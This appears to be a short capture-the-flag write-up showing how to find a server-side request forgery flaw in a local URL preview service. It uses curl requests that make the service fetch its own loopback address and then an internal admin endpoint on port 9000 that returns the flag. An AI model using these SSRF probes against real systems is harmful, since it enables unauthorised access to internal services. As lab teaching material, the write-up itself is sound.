# Finding the Bug

## Step 1: Enumerate the Service

```bash
curl http://localhost:8080/
```

Output:
```
URL Preview Service v1.0

Endpoints:
  GET /fetch?url=<url>  -- fetch a URL and return its content
```

The endpoint fetches any URL. There is no visible restriction on the target host.

## Step 2: Test a Normal Fetch

```bash
curl "http://localhost:8080/fetch?url=http://example.com/"
```

The server fetches `example.com` and returns the HTML. The app is acting as a proxy.

## Step 3: Check What Runs Internally

The app itself is on port 8080. Try asking it to fetch itself:

```bash
curl "http://localhost:8080/fetch?url=http://127.0.0.1:8080/"
```

Output:
```
URL Preview Service v1.0
...
```

The server fetched its own homepage. It is making requests to 127.0.0.1 without restriction.

## Step 4: Probe Other Internal Ports

```bash
curl "http://localhost:8080/fetch?url=http://127.0.0.1:9000/admin"
```

There is something running on port 9000. The response contains the flag.
